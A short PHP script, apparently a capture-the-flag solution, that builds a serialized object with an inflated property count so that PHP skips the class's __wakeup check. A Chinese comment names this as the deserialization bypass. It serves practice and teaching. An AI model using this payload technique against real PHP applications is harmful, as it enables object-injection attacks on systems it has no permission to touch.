<?php
/**
 * Created by .
 * Date 9/16/20
 * Time 8:16 PM
 * User chenlei
 */


class xctf{
    public $flag = '111';
    public function __wakeup(){
        exit('bad requests');
    }
}

//本题考查的是反序列化的问题, 可以通过更改对象的成员数量达到绕过__wakeup
$model = new xctf();
$str = serialize($model);
//echo $str;
$str = str_replace('1:', '2:', $str);
echo $str;